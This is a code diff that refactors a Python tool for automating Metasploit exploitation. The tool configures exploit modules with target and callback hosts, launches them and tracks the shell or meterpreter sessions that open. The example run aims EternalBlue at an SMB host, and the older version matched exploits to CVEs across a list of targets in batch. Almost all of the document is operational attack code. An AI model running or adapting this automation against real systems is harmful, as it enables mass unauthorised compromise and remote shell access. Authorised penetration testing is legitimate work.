@@ -1,30 +1,42 @@
+"""
+Enhanced Pentest Automation Tool
+This version includes improved security, better error handling, and cleaner architecture
+"""
+
+import asyncio
 import json
+import os
 import sys
 import time
-from typing import Dict, List, Optional, Tuple
-from pymetasploit3.msfrpc import MsfRpcClient
 import logging
 import socket
 import netifaces
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import re
+from typing import Dict, List, Optional, Tuple, Any
+from datetime import datetime
 from dataclasses import dataclass
 from enum import Enum
 import queue
-import traceback
-from datetime import datetime
+from pymetasploit3.msfrpc import MsfRpcClient
+from contextlib import asynccontextmanager
+from logging.handlers import RotatingFileHandler
+import yaml
 
-# カスタム例外クラス
+# Configuration and Constants
+CONFIG_PATH = "config.yaml"
+MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
+MAX_LOG_FILES = 5
+
 class PentestAutomationError(Exception):
     """Base exception for pentest automation"""
     pass
 
-class ConnectionError(PentestAutomationError):
-    """Connection related errors"""
+class ConfigurationError(PentestAutomationError):
+    """Configuration related errors"""
     pass
 
-class PayloadError(PentestAutomationError):
-    """Payload related errors"""
+class ConnectionError(PentestAutomationError):
+    """Connection related errors"""
     pass
 
 class ExploitError(PentestAutomationError):
@@ -35,14 +47,30 @@ class ValidationError(PentestAutomationError):
     """Data validation related errors"""
     pass
 
-# 実行状態を表すEnum
 class ExploitStatus(Enum):
     SUCCESS = "success"
     FAILURE = "failure"
     TIMEOUT = "timeout"
     ERROR = "error"
 
-# 実行結果を格納するデータクラス
+@dataclass
+class ExploitConfiguration:
+    target_ip: str
+    target_port: int
+    module_path: str
+    cve: str
+    options: Dict[str, Any]
+    timeout: Optional[int] = None
+    retry_count: int = 3
+    
+    def validate(self) -> bool:
+        """Validate configuration parameters"""
+        if not self.target_ip or not self.target_port:
+            return False
+        if not self.module_path or not self.cve:
+            return False
+        return True
+
 @dataclass
 class ExploitResult:
     target_ip: str
@@ -53,45 +81,31 @@ class ExploitResult:
     message: str
     timestamp: datetime
     execution_time: float
+    session_id: Optional[str] = None
 
-class PentestAutomation:
-    def __init__(self, result_file: str, lhost: Optional[str] = None, 
-                 lport: int = 4444, max_workers: int = 5,
-                 default_timeout: int = 30):
-        """
-        Enhanced initialization with thread pool and timeout settings
-        """
-        self.result_file = result_file
-        self.max_workers = max_workers
-        self.default_timeout = default_timeout
-        self.results_queue = queue.Queue()
-        
-        # Set up enhanced logging
-        self._setup_logging()
-        
-        try:
-            self.lhost = lhost or self._get_local_ip()
-            self.lport = lport
-            self.results = self._load_results()
-            self.client = MsfRpcClient('your_password')
-            
-            self.logger.info(f"""Initialization completed:
-                - Local host: {self.lhost}
-                - Local port: {self.lport}
-                - Max workers: {max_workers}
-                - Default timeout: {default_timeout}s
-                - Total targets: {len(self.results)}
-            """)
-            
-        except Exception as e:
-            self.logger.critical(f"Critical error during initialization: {str(e)}")
-            self.logger.debug(f"Detailed traceback: {traceback.format_exc()}")
-            raise ConnectionError(f"Failed to initialize: {str(e)}")
-
-    def _setup_logging(self):
-        """Enhanced logging setup with both file and console handlers"""
-        self.logger = logging.getLogger(__name__)
+class SecureLogger:
+    """Enhanced secure logging functionality"""
+    
+    def __init__(self, name: str, log_dir: str = "logs"):
+        self.logger = logging.getLogger(name)
         self.logger.setLevel(logging.DEBUG)
+        
+        # Ensure log directory exists
+        os.makedirs(log_dir, exist_ok=True)
+        
+        # Create secure log file with rotation
+        log_file = os.path.join(log_dir, f'{name}_{datetime.now().strftime("%Y%m%d")}.log')
+        file_handler = RotatingFileHandler(
+            log_file,
+            maxBytes=MAX_LOG_SIZE,
+            backupCount=MAX_LOG_FILES,
+            mode='a'
+        )
+        file_handler.setLevel(logging.DEBUG)
+        
+        # Create console handler
+        console_handler = logging.StreamHandler()
+        console_handler.setLevel(logging.INFO)
         
         # Create formatters
         file_formatter = logging.Formatter(
@@ -101,235 +115,275 @@ class PentestAutomation:
             '%(asctime)s - %(levelname)s - %(message)s'
         )
         
-        # File handler (detailed logging)
-        file_handler = logging.FileHandler(
-            f'pentest_automation_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'
-        )
-        file_handler.setLevel(logging.DEBUG)
+        # Set formatters
         file_handler.setFormatter(file_formatter)
-        
-        # Console handler (info level)
-        console_handler = logging.StreamHandler()
-        console_handler.setLevel(logging.INFO)
         console_handler.setFormatter(console_formatter)
         
+        # Add handlers
         self.logger.addHandler(file_handler)
         self.logger.addHandler(console_handler)
+    
+    def _mask_sensitive_info(self, message: str) -> str:
+        """Mask sensitive information in log messages"""
+        patterns = [
+            (r'password["\s]*:["\s]*[^"}\s]+', 'password: *****'),
+            (r'session[_\s]?id["\s]*:["\s]*[^"}\s]+', 'session_id: *****'),
+            (r'token["\s]*:["\s]*[^"}\s]+', 'token: *****'),
+            (r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', '[MASKED_IP]')
+        ]
+        for pattern, replacement in patterns:
+            message = re.sub(pattern, replacement, message, flags=re.IGNORECASE)
+        return message
+    
+    def info(self, message: str):
+        self.logger.info(self._mask_sensitive_info(message))
+    
+    def error(self, message: str):
+        self.logger.error(self._mask_sensitive_info(message))
+    
+    def debug(self, message: str):
+        self.logger.debug(self._mask_sensitive_info(message))
+    
+    def warning(self, message: str):
+        self.logger.warning(self._mask_sensitive_info(message))
+    
+    def critical(self, message: str):
+        self.logger.critical(self._mask_sensitive_info(message))
 
-    async def run_exploit_with_timeout(self, target_ip: str, target_port: int, 
-                                     module_path: str, options: Dict,
-                                     platform: str = "windows",
-                                     timeout: Optional[int] = None) -> ExploitResult:
-        """
-        Enhanced exploit execution with timeout and detailed result tracking
-        """
+class PentestAutomation:
+    def __init__(self, config_path: str):
+        """Initialize with configuration file"""
+        self.logger = SecureLogger(__name__)
+        self.config = self._load_config(config_path)
+        self.results_queue: queue.Queue = queue.Queue()
+        self.active_sessions: Dict[str, Any] = {}
+        
+        # Initialize connection
+        self._initialize_connection()
+    
+    def _load_config(self, config_path: str) -> Dict:
+        """Load configuration from YAML file"""
+        try:
+            with open(config_path, 'r') as f:
+                config = yaml.safe_load(f)
+                
+            required_fields = ['msf_host', 'msf_port', 'msf_password', 'lhost', 'lport']
+            for field in required_fields:
+                if field not in config:
+                    raise ConfigurationError(f"Missing required configuration field: {field}")
+            
+            return config
+        except Exception as e:
+            raise ConfigurationError(f"Failed to load configuration: {str(e)}")
+    
+    def _initialize_connection(self):
+        """Initialize connection to Metasploit RPC server"""
+        try:
+            self.client = MsfRpcClient(
+                password=self.config['msf_password'],
+                server=self.config['msf_host'],
+                port=self.config['msf_port']
+            )
+            self.logger.info("Successfully connected to Metasploit RPC server")
+        except Exception as e:
+            raise ConnectionError(f"Failed to connect to Metasploit RPC server: {str(e)}")
+    
+    @asynccontextmanager
+    async def _managed_console(self):
+        """Context manager for Metasploit console"""
+        console = None
+        try:
+            console = self.client.consoles.console()
+            yield console
+        finally:
+            if console:
+                try:
+                    await asyncio.wait_for(
+                        asyncio.to_thread(console.destroy),
+                        timeout=5.0
+                    )
+                except Exception as e:
+                    self.logger.error(f"Failed to destroy console: {str(e)}")
+
+    async def run_exploit(self, config: ExploitConfiguration) -> ExploitResult:
+        """Execute exploit with enhanced error handling and resource management"""
         start_time = time.time()
-        timeout = timeout or self.default_timeout
+        
+        if not config.validate():
+            raise ValidationError("Invalid exploit configuration")
         
         try:
-            self.logger.info(f"Starting exploit execution for {target_ip}:{target_port}")
-            
-            # Create new console with timeout
-            console = self.client.consoles.console()
-            module = self.client.modules.use('exploit', module_path)
-            
-            # Get and validate payload
-            payload_path = await self.get_suitable_payload(module_path, platform)
-            if not payload_path:
-                raise PayloadError(f"No suitable payload found for {platform}")
-            
-            self.logger.debug(f"Selected payload: {payload_path}")
-            
-            # Configure exploit
-            module['RHOSTS'] = target_ip
-            module['RPORT'] = target_port
-            module['PAYLOAD'] = payload_path
-            module['LHOST'] = self.lhost
-            module['LPORT'] = self.lport
-            
-            # Set additional options
-            for opt, value in options.items():
-                if opt not in ['RHOSTS', 'RPORT', 'PAYLOAD', 'LHOST', 'LPORT']:
-                    module[opt] = value
-            
-            # Execute with timeout
-            result = await asyncio.wait_for(
-                self._execute_exploit(module, console),
-                timeout=timeout
-            )
-            
-            execution_time = time.time() - start_time
-            
-            if result:
-                status = ExploitStatus.SUCCESS
-                message = "Exploit completed successfully"
-            else:
-                status = ExploitStatus.FAILURE
-                message = "Exploit failed to achieve expected result"
-            
+            async with self._managed_console() as console:
+                module = self.client.modules.use('exploit', config.module_path)
+                
+                # Configure exploit
+                module['RHOSTS'] = config.target_ip
+                module['RPORT'] = config.target_port
+                module['LHOST'] = self.config['lhost']
+                module['LPORT'] = self.config['lport']
+                
+                for opt, value in config.options.items():
+                    if opt not in ['RHOSTS', 'RPORT', 'LHOST', 'LPORT']:
+                        module[opt] = value
+                
+                # Execute exploit with timeout
+                result = await asyncio.wait_for(
+                    self._execute_exploit(module, console),
+                    timeout=config.timeout or self.config.get('default_timeout', 30)
+                )
+                
+                execution_time = time.time() - start_time
+                
+                if result.get('success'):
+                    status = ExploitStatus.SUCCESS
+                    message = "Exploit completed successfully"
+                    session_id = result.get('session_id')
+                else:
+                    status = ExploitStatus.FAILURE
+                    message = result.get('message', "Exploit failed")
+                    session_id = None
+                
         except asyncio.TimeoutError:
             status = ExploitStatus.TIMEOUT
-            message = f"Exploit execution timed out after {timeout} seconds"
-            execution_time = timeout
+            message = f"Exploit execution timed out"
+            execution_time = time.time() - start_time
+            session_id = None
             
         except Exception as e:
             status = ExploitStatus.ERROR
-            message = f"Error during exploit execution: {str(e)}"
+            message = str(e)
             execution_time = time.time() - start_time
-            self.logger.error(f"Detailed error: {traceback.format_exc()}")
-            
-        finally:
-            if 'console' in locals():
-                console.destroy()
+            session_id = None
+            self.logger.error(f"Exploit error: {str(e)}")
         
-        # Create and return result object
         result = ExploitResult(
-            target_ip=target_ip,
-            target_port=target_port,
-            cve=options.get('cve', 'Unknown'),
-            module_path=module_path,
+            target_ip=config.target_ip,
+            target_port=config.target_port,
+            cve=config.cve,
+            module_path=config.module_path,
             status=status,
             message=message,
             timestamp=datetime.now(),
-            execution_time=execution_time
+            execution_time=execution_time,
+            session_id=session_id
         )
         
         self.results_queue.put(result)
         return result
 
-    async def _execute_exploit(self, module, console) -> bool:
-        """Separated exploit execution logic for better error handling"""
+    async def _execute_exploit(self, module: Any, console: Any) -> Dict[str, Any]:
+        """Execute exploit and monitor for success"""
         try:
-            sessions_before = len(self.client.sessions.list)
+            sessions_before = set(self.client.sessions.list.keys())
             
             # Execute exploit
             exploit_result = module.execute()
             
-            # Initial wait for session
-            await asyncio.sleep(5)
+            # Monitor for new session
+            for _ in range(10):  # Check for 10 seconds
+                await asyncio.sleep(1)
+                sessions_after = set(self.client.sessions.list.keys())
+                new_sessions = sessions_after - sessions_before
+                
+                if new_sessions:
+                    session_id = list(new_sessions)[0]
+                    self.active_sessions[session_id] = {
+                        'created_at': datetime.now(),
+                        'module': module.modulename
+                    }
+                    return {
+                        'success': True,
+                        'session_id': session_id
+                    }
             
-            # Check for new session
-            if len(self.client.sessions.list) > sessions_before:
-                self.logger.info("Session established successfully")
-                return True
-            
-            # Check console output
+            # Check console output for success indicators
             output = console.read()
-            success_indicators = [
+            if any(indicator in output.lower() for indicator in [
                 'session opened',
                 'success',
                 'meterpreter session',
                 'command shell session'
-            ]
+            ]):
+                return {
+                    'success': True,
+                    'message': 'Exploit completed successfully'
+                }
             
-            return any(indicator in output.lower() for indicator in success_indicators)
+            return {
+                'success': False,
+                'message': 'No session established'
+            }
             
         except Exception as e:
-            self.logger.error(f"Error during exploit execution: {str(e)}")
-            raise ExploitError(f"Exploit execution failed: {str(e)}")
+            return {
+                'success': False,
+                'message': str(e)
+            }
 
-    async def process_target(self, result: Dict) -> ExploitResult:
-        """Process individual target with enhanced error handling"""
+    async def cleanup_sessions(self):
+        """Cleanup old or inactive sessions"""
         try:
-            self.logger.info(f"Processing target: {result['ip']}:{result['port']}")
+            current_time = datetime.now()
+            for session_id, session_info in list(self.active_sessions.items()):
+                if (current_time - session_info['created_at']).total_seconds() > self.config.get('session_timeout', 3600):
+                    try:
+                        self.client.sessions.session(session_id).stop()
+                        del self.active_sessions[session_id]
+                        self.logger.info(f"Cleaned up session {session_id}")
+                    except Exception as e:
+                        self.logger.error(f"Failed to cleanup session {session_id}: {str(e)}")
+        except Exception as e:
+            self.logger.error(f"Session cleanup error: {str(e)}")
+
+    def save_results(self, results: List[ExploitResult], output_file: str):
+        """Save results to file with sensitive data masking"""
+        try:
+            output_data = []
+            for result in results:
+                result_dict = {
+                    'timestamp': result.timestamp.isoformat(),
+                    'target_ip': '[MASKED]',  # Mask IP for security
+                    'target_port': result.target_port,
+                    'cve': result.cve,
+                    'status': result.status.value,
+                    'message': result.message,
+                    'execution_time': result.execution_time
+                }
+                output_data.append(result_dict)
             
-            # Validate target data
-            if not self._validate_target_data(result):
-                raise ValidationError(f"Invalid target data: {result}")
+            with open(output_file, 'w') as f:
+                json.dump(output_data, f, indent=2)
             
-            # Determine target platform
-            platform = self._detect_platform(result['service'])
-            self.logger.debug(f"Detected platform: {platform}")
-            
-            # Search for exploit
-            module_path = await self.search_exploit(result['cve'])
-            if not module_path:
-                raise ExploitError(f"No suitable exploit found for {result['cve']}")
-            
-            # Get exploit options
-            options = await self.get_module_options(module_path)
-            
-            # Execute exploit
-            return await self.run_exploit_with_timeout(
-                result['ip'],
-                result['port'],
-                module_path,
-                options,
-                platform
-            )
+            self.logger.info(f"Results saved to {output_file}")
             
         except Exception as e:
-            self.logger.error(f"Error processing target: {str(e)}")
-            self.logger.debug(f"Detailed error: {traceback.format_exc()}")
-            
-            return ExploitResult(
-                target_ip=result.get('ip', 'Unknown'),
-                target_port=result.get('port', 0),
-                cve=result.get('cve', 'Unknown'),
-                module_path='',
-                status=ExploitStatus.ERROR,
-                message=str(e),
-                timestamp=datetime.now(),
-                execution_time=0
-            )
-
-    async def process_results(self):
-        """Enhanced multi-threaded results processing"""
-        self.logger.info(f"Starting processing of {len(self.results)} targets")
-        
-        tasks = []
-        async with asyncio.Semaphore(self.max_workers):
-            for result in self.results:
-                task = asyncio.create_task(self.process_target(result))
-                tasks.append(task)
-            
-            completed_results = await asyncio.gather(*tasks, return_exceptions=True)
-        
-        # Process and summarize results
-        self._summarize_results(completed_results)
-
-    def _summarize_results(self, results: List[ExploitResult]):
-        """Summarize execution results"""
-        summary = {status: 0 for status in ExploitStatus}
-        total_time = 0
-        
-        for result in results:
-            summary[result.status] += 1
-            total_time += result.execution_time
-        
-        self.logger.info(f"""
-        Execution Summary:
-        -----------------
-        Total targets: {len(results)}
-        Successful exploits: {summary[ExploitStatus.SUCCESS]}
-        Failed exploits: {summary[ExploitStatus.FAILURE]}
-        Timeouts: {summary[ExploitStatus.TIMEOUT]}
-        Errors: {summary[ExploitStatus.ERROR]}
-        Total execution time: {total_time:.2f} seconds
-        Average time per target: {total_time/len(results):.2f} seconds
-        """)
+            self.logger.error(f"Failed to save results: {str(e)}")
 
 async def main():
-    if len(sys.argv) not in [2, 3, 4]:
-        print("""
-        Usage: python pentest_automation.py <results_file.json> [lhost] [lport]
-        Optional arguments:
-        --max-workers <int>: Maximum number of concurrent workers (default: 5)
-        --timeout <int>: Default timeout in seconds (default: 30)
-        """)
+    if len(sys.argv) != 2:
+        print("Usage: python pentest_automation.py <config.yaml>")
         sys.exit(1)
     
     try:
-        result_file = sys.argv[1]
-        lhost = sys.argv[2] if len(sys.argv) > 2 else None
-        lport = int(sys.argv[3]) if len(sys.argv) > 3 else 4444
+        automation = PentestAutomation(sys.argv[1])
         
-        automation = PentestAutomation(result_file, lhost, lport)
-        await automation.process_results()
+        # Example usage
+        config = ExploitConfiguration(
+            target_ip="192.168.1.100",
+            target_port=445,
+            module_path="exploit/windows/smb/ms17_010_eternalblue",
+            cve="CVE-2017-0144",
+            options={},
+            timeout=30
+        )
+        
+        result = await automation.run_exploit(config)
+        await automation.cleanup_sessions()
+        
+        automation.save_results([result], "exploit_results.json")
         
     except Exception as e:
-        logging.error(f"Critical error in main: {str(e)}")
-        logging.debug(f"Detailed traceback: {traceback.format_exc()}")
+        logging.error(f"Critical error: {str(e)}")
         sys.exit(1)
 
 if __name__ == "__main__":
